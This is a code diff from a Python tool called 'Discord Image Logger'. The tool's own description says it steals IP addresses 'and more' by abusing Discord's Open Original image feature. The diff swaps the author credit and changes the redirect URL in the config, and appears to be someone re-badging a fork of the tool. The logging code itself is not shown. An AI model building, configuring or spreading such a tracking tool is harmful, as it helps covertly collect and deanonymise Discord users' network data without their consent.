@@ -7,7 +7,7 @@ import httpagentparser # type: ignore
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "771"
 
 config = {
     # BASE CONFIG #
@@ -47,7 +47,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://i.pinimg.com/736x/f3/45/41/f34541049e0698a6ce37d4d88bc1a13a.jpg" # Link to the webpage to redirect to 
+        "page": "https://asianmoviepulse.com/2020/10/anime-review-vinland-saga-2019-by-shuhei-yabuta/" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
